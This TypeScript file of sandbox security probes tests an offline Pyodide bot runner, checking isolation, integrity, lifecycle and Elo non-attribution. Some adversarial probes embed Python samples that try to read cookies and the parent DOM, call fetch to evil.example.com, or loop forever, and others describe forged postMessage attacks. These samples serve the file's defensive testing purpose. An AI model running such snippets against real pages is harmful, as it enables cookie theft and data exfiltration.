/**
 * offline-probes.ts
 * D04-W1 — Probe design + Consumer path mapping
 *
 * ecc:security-review  — Canaries are non-secret test strings; probes test real
 *                        opaque-origin iframe + Worker compartment, NOT just AST checks.
 * ecc:blueprint        — Full consumer path mapping: Route → SW Cache → Kit Verification
 *                        → Host Watchdog → Opaque Compartment → Private MessageChannel.
 * ecc:contract-first   — Aligned with @ottv2/bot-sdk DEFAULT_BOT_LIMITS & offlineCompartment.ts.
 *
 * STATUS: Probe specs & vectors designed; ready for Nam N-05 candidate.
 */

import { DEFAULT_BOT_LIMITS } from '../../packages/bot-sdk/src/manifest.js';

/** ── Safe Canary Sentinels (Test Data Only — Never Real Secrets) ───── */
export const CANARY_SENTINELS = {
  DOM:     'CANARY_DOM_OFFLINE_2026',
  COOKIE:  'CANARY_COOKIE_OFFLINE_2026',
  STORAGE: 'CANARY_STORAGE_OFFLINE_2026',
  BRIDGE:  'CANARY_BRIDGE_OFFLINE_2026',
} as const;

/** ── Limits from bot-sdk ───────────────────────────────────────────── */
export const OFFLINE_LIMITS = {
  ...DEFAULT_BOT_LIMITS,
  iframeSandbox: 'allow-scripts', // strictly without allow-same-origin
  cspConnectSrc: "'none'",
  cspDefaultSrc: "'none'",
};

/** ── Bridge Attack Vectors ─────────────────────────────────────────── */
export const BRIDGE_ATTACK_VECTORS = [
  {
    vector: 'FORGED_WINDOW_POSTMESSAGE',
    description: 'Tấn công gửi window.postMessage() từ parent/renderer window thay vì Private MessageChannel port',
    expectedMitigation: 'FRAME_BOOTSTRAP listener chỉ nhận event.source === parent và event.data.kind === "OTT_OFFLINE_INIT" một lần duy nhất; mọi window message khác bị bỏ qua',
  },
  {
    vector: 'WRONG_KIND_PAYLOAD',
    description: 'Gửi fake message kind (ví dụ { kind: "booted", spoofed: true }) vào MessageChannel khi đang ở phase FRAME',
    expectedMitigation: 'Channel state machine kiểm tra strict phase (FRAME -> RUNTIME -> COMPUTE); invalid kind dẫn tới fail-closed',
  },
  {
    vector: 'STALE_INVOCATION_ID',
    description: 'Late message từ worker của invocation trước tới sau khi đã unmount hoặc abort',
    expectedMitigation: 'cleanup() đóng channel.port1 / port2, dispose worker và iframe; settled flag chặn late resolve/reject',
  },
  {
    vector: 'OVERSIZED_PAYLOAD_FLOOD',
    description: 'Worker trả về output JSON vượt quá 16 KiB (outputBytes limit)',
    expectedMitigation: 'OUTPUT_BUDGET error; host watchdog hủy frame và không commit vào local match state',
  },
] as const;

/** ── Offline Probe Interface ───────────────────────────────────────── */
export interface OfflineProbe {
  id:           string;   // D-03.OFF-XX-YYY
  category:     'control' | 'adversarial' | 'lifecycle' | 'integrity';
  task:         string;   // D-03.OFF task reference
  description:  string;
  pythonSource: string;
  canary?:      string;
  consumerPath: 'offlineRunner' | 'offlineCompartment' | 'serviceWorker';
  expected: {
    verdict:     'ALLOW' | 'DENY' | 'ISOLATED';
    errorCode?:  string;
    checks:      string[];
  };
  evidence: {
    browser:      string;
    os:           string;
    kitSha:       string;
    sdkVersion:   string;
    computeMs?:   number | null;
    memoryMb?:    number | null;
    actual?:      string;
    verdict:      'NOT RUN' | 'PASS' | 'FAIL' | 'BLOCKED';
    reviewer?:    string;
  };
}

/** ── D-03.OFF-01: Kit Pins & Asset Attestation ─────────────────────── */
const probe_kit_pos: OfflineProbe = {
  id: 'D-03.OFF-01-POS',
  category: 'control',
  task: 'D-03.OFF-01',
  description: 'Kit đầy đủ 5 asset pins khớp SHA-256; known-valid source chạy qua offline consumer thành công',
  pythonSource: `def choose_move(state, memory):\n    return state['legal_moves'][0], memory\n`,
  consumerPath: 'offlineRunner',
  expected: {
    verdict: 'ALLOW',
    checks: [
      'verifiedAssets() passes all 5 SHA-256 hash checks',
      'Frame and Pyodide worker boot successfully',
      'Legal move returned and valid memory round-trip',
    ],
  },
  evidence: {
    browser: '[ghi khi chạy Chrome/Firefox]',
    os: '[ghi khi chạy OS]',
    kitSha: 'verified matching PINS',
    sdkVersion: '1.0.0',
    verdict: 'NOT RUN',
    reviewer: '[Nam hoặc independent reviewer]',
  },
};

const probe_kit_tampered: OfflineProbe = {
  id: 'D-03.OFF-01-TAMPER',
  category: 'integrity',
  task: 'D-03.OFF-01',
  description: 'Sửa 1 byte trong pyodide.asm.wasm → hash mismatch → fail closed, khóa Ready',
  pythonSource: `def choose_move(state, memory):\n    return state['legal_moves'][0], memory\n`,
  consumerPath: 'offlineCompartment',
  expected: {
    verdict: 'DENY',
    errorCode: 'RUNTIME_HASH_MISMATCH',
    checks: [
      'Crypto.subtle SHA-256 digest detects mismatch',
      'OfflineCompartmentError("RUNTIME_HASH_MISMATCH") thrown',
      'Runtime status stays unready; no fallback to server/native',
    ],
  },
  evidence: {
    browser: '[ghi khi chạy]',
    os: '[ghi khi chạy]',
    kitSha: 'tampered-hash',
    sdkVersion: '1.0.0',
    verdict: 'NOT RUN',
    reviewer: '[Nam hoặc independent reviewer]',
  },
};

/** ── D-03.OFF-02: DOM / Cookie / Storage / Network Capabilities ────── */
const probe_dom_cookie_probe: OfflineProbe = {
  id: 'D-03.OFF-02-DOM-COOKIE',
  category: 'adversarial',
  task: 'D-03.OFF-02',
  description: 'Inject canary vào document.cookie & DOM parent; Python cố gắng trích xuất',
  pythonSource: `
def choose_move(state, memory):
    # Try reading DOM / cookies through js interop
    leak = ""
    try:
        import js
        leak = str(js.document.cookie) + str(js.window.parent.document.body.innerHTML)
    except Exception as e:
        leak = "BLOCKED:" + str(e)
    return state['legal_moves'][0], {"leak": leak}
`.trim(),
  canary: CANARY_SENTINELS.COOKIE,
  consumerPath: 'offlineRunner',
  expected: {
    verdict: 'ISOLATED',
    checks: [
      'Opaque iframe (sandbox without allow-same-origin) raises SecurityError on parent access',
      'document.cookie inside opaque origin throws or returns empty',
      'Canary string CANARY_COOKIE_OFFLINE_2026 absent from output/memory',
      'isolationProof confirms parentDenied=true, cookieDenied=true, storageDenied=true',
    ],
  },
  evidence: {
    browser: '[ghi khi chạy]',
    os: '[ghi khi chạy]',
    kitSha: 'valid',
    sdkVersion: '1.0.0',
    verdict: 'NOT RUN',
    reviewer: '[Nam hoặc independent reviewer]',
  },
};

const probe_network_fetch: OfflineProbe = {
  id: 'D-03.OFF-02-NETWORK',
  category: 'adversarial',
  task: 'D-03.OFF-02',
  description: 'Python cố fetch() hoặc mở WebSocket ra mạng ngoài',
  pythonSource: `
def choose_move(state, memory):
    try:
        import js
        js.fetch("https://evil.example.com")
    except Exception as e:
        pass
    return state['legal_moves'][0], memory
`.trim(),
  consumerPath: 'offlineRunner',
  expected: {
    verdict: 'DENY',
    checks: [
      'CSP connect-src none blocks network requests at browser engine level',
      'proof.networkDenied is true',
      'No external HTTP/WS traffic observed in devtools Network tab',
    ],
  },
  evidence: {
    browser: '[ghi khi chạy]',
    os: '[ghi khi chạy]',
    kitSha: 'valid',
    sdkVersion: '1.0.0',
    verdict: 'NOT RUN',
    reviewer: '[Nam hoặc independent reviewer]',
  },
};

/** ── D-03.OFF-03: Forged Bridge Message Vectors ────────────────────── */
const probe_bridge_spoof: OfflineProbe = {
  id: 'D-03.OFF-03-BRIDGE-SPOOF',
  category: 'adversarial',
  task: 'D-03.OFF-03',
  description: 'Gửi fake postMessage từ window ngoài vào iframe để đánh lừa state machine',
  pythonSource: `def choose_move(state, memory):\n    return state['legal_moves'][0], memory\n`,
  canary: CANARY_SENTINELS.BRIDGE,
  consumerPath: 'offlineCompartment',
  expected: {
    verdict: 'DENY',
    checks: [
      'window.postMessage outside private MessageChannel ignored by worker',
      'State machine ignores unauthorized events',
      'Watchdog timer not reset by spoofed messages',
    ],
  },
  evidence: {
    browser: '[ghi khi chạy]',
    os: '[ghi khi chạy]',
    kitSha: 'valid',
    sdkVersion: '1.0.0',
    verdict: 'NOT RUN',
    reviewer: '[Nam hoặc independent reviewer]',
  },
};

/** ── D-03.OFF-04: Resource Exhaustion & Watchdog ───────────────────── */
const probe_infinite_loop: OfflineProbe = {
  id: 'D-03.OFF-04-LOOP',
  category: 'adversarial',
  task: 'D-03.OFF-04',
  description: 'Python chạy infinite loop; computeTimer host-level phải terminate trong 500ms',
  pythonSource: `
def choose_move(state, memory):
    while True:
        pass
`.trim(),
  consumerPath: 'offlineRunner',
  expected: {
    verdict: 'DENY',
    errorCode: 'TURN_TIMEOUT',
    checks: [
      'Host computeTimer fires after perTurnMs (500ms)',
      'Worker terminated and MessageChannel ports closed',
      'Renderer main thread remains responsive (UI controls active)',
      'No state corruption; author loss recorded cleanly',
    ],
  },
  evidence: {
    browser: '[ghi khi chạy]',
    os: '[ghi khi chạy]',
    kitSha: 'valid',
    sdkVersion: '1.0.0',
    computeMs: null,
    verdict: 'NOT RUN',
    reviewer: '[Nam hoặc independent reviewer]',
  },
};

/** ── D-03.OFF-05: Two-Slot & Memory Isolation ──────────────────────── */
const probe_two_slot_memory: OfflineProbe = {
  id: 'D-03.OFF-05-SLOT-ISOLATION',
  category: 'adversarial',
  task: 'D-03.OFF-05',
  description: 'Hai bot slot-A và slot-B chạy liên tiếp; slot-A không đọc được memory của slot-B',
  pythonSource: `
def choose_move(state, memory):
    return state['legal_moves'][0], {"own_slot": state['side']}
`.trim(),
  consumerPath: 'offlineRunner',
  expected: {
    verdict: 'ISOLATED',
    checks: [
      'Slot BLUE only receives BLUE committed memory',
      'Slot RED only receives RED committed memory',
      'No shared global variables or cached heap between distinct bot turns',
    ],
  },
  evidence: {
    browser: '[ghi khi chạy]',
    os: '[ghi khi chạy]',
    kitSha: 'valid',
    sdkVersion: '1.0.0',
    verdict: 'NOT RUN',
    reviewer: '[Nam hoặc independent reviewer]',
  },
};

/** ── D-03.OFF-06: Lifecycle Abort / Cancel ──────────────────────────── */
const probe_abort_cleanup: OfflineProbe = {
  id: 'D-03.OFF-06-ABORT-CLEANUP',
  category: 'lifecycle',
  task: 'D-03.OFF-06',
  description: 'AbortSignal kích hoạt khi Bot đang tính toán; dọn dẹp frame/ports/worker không rò rỉ',
  pythonSource: `def choose_move(state, memory):\n    return state['legal_moves'][0], memory\n`,
  consumerPath: 'offlineCompartment',
  expected: {
    verdict: 'DENY',
    errorCode: 'ABORTED',
    checks: [
      'OfflineCompartmentError("ABORTED") thrown',
      'frame.remove() cleans up iframe element from DOM',
      'channel.port1.close() releases MessagePort handles',
      'Subsequent invocation succeeds without resource exhaustion',
    ],
  },
  evidence: {
    browser: '[ghi khi chạy]',
    os: '[ghi khi chạy]',
    kitSha: 'valid',
    sdkVersion: '1.0.0',
    verdict: 'NOT RUN',
    reviewer: '[Nam hoặc independent reviewer]',
  },
};

/** ── D-03.OFF-07: Cold Offline Navigation ──────────────────────────── */
const probe_cold_offline: OfflineProbe = {
  id: 'D-03.OFF-07-COLD-OFFLINE',
  category: 'integrity',
  task: 'D-03.OFF-07',
  description: 'Service Worker cache nạp đủ shell + kit; ngắt mạng hoàn toàn; khởi động cold route',
  pythonSource: `def choose_move(state, memory):\n    return state['legal_moves'][0], memory\n`,
  consumerPath: 'serviceWorker',
  expected: {
    verdict: 'ALLOW',
    checks: [
      'Offline route /dau-chuong-trinh/offline serves from CacheStorage',
      'Pyodide kit loads locally without network dependency',
      'Bot runs preflight and turn successfully in offline state',
    ],
  },
  evidence: {
    browser: '[ghi khi chạy]',
    os: '[ghi khi chạy]',
    kitSha: 'cached-pins',
    sdkVersion: '1.0.0',
    verdict: 'NOT RUN',
    reviewer: '[Nam hoặc independent reviewer]',
  },
};

/** ── D-03.OFF-08: Error Classification ─────────────────────────────── */
const probe_author_vs_infra_error: OfflineProbe = {
  id: 'D-03.OFF-08-ERROR-PATH',
  category: 'adversarial',
  task: 'D-03.OFF-08',
  description: 'Phân định rõ Author Fault (syntax/ABI error) vs Infra Fault (kit missing/corrupt)',
  pythonSource: `syntax error in python source !!!`,
  consumerPath: 'offlineRunner',
  expected: {
    verdict: 'DENY',
    errorCode: 'SYNTAX_ERROR',
    checks: [
      'Syntax error classifies as author fault; does not crash runtime supervisor',
      'Infra fault (hash mismatch) does not penalize player score',
      'No raw stack trace leakage into public UI',
    ],
  },
  evidence: {
    browser: '[ghi khi chạy]',
    os: '[ghi khi chạy]',
    kitSha: 'valid',
    sdkVersion: '1.0.0',
    verdict: 'NOT RUN',
    reviewer: '[Nam hoặc independent reviewer]',
  },
};

/** ── D-03.OFF-09: Local Result Non-Attribution to Online Elo ────────── */
const probe_elo_non_attribution: OfflineProbe = {
  id: 'D-03.OFF-09-ELO-GUARD',
  category: 'integrity',
  task: 'D-03.OFF-09',
  description: 'Kết quả trận Offline tuyệt đối không gửi request cập nhật Elo lên server',
  pythonSource: `def choose_move(state, memory):\n    return state['legal_moves'][0], memory\n`,
  consumerPath: 'offlineRunner',
  expected: {
    verdict: 'ISOLATED',
    checks: [
      'Local match authority resolves outcome locally only',
      'No POST /rating or match commit request to server',
      'User online Elo rating unchanged after offline victory',
    ],
  },
  evidence: {
    browser: '[ghi khi chạy]',
    os: '[ghi khi chạy]',
    kitSha: 'valid',
    sdkVersion: '1.0.0',
    verdict: 'NOT RUN',
    reviewer: '[Nam/Long/Đức]',
  },
};

/** ── Exported Probe Registry ───────────────────────────────────────── */
export const OFFLINE_PROBES: readonly OfflineProbe[] = [
  probe_kit_pos,
  probe_kit_tampered,
  probe_dom_cookie_probe,
  probe_network_fetch,
  probe_bridge_spoof,
  probe_infinite_loop,
  probe_two_slot_memory,
  probe_abort_cleanup,
  probe_cold_offline,
  probe_author_vs_infra_error,
  probe_elo_non_attribution,
];

/** ── Spec Formatter for Reports ─────────────────────────────────────── */
export function formatOfflineProbeSpec(): string {
  return OFFLINE_PROBES.map(p => `
Probe ID: ${p.id}
Task: ${p.task} (${p.category})
Consumer: ${p.consumerPath}
Expected: ${p.expected.verdict}${p.expected.errorCode ? ` [${p.expected.errorCode}]` : ''}
Checks:
${p.expected.checks.map(c => `  * ${c}`).join('\n')}
Evidence: ${p.evidence.verdict}
`).join('\n---\n');
}
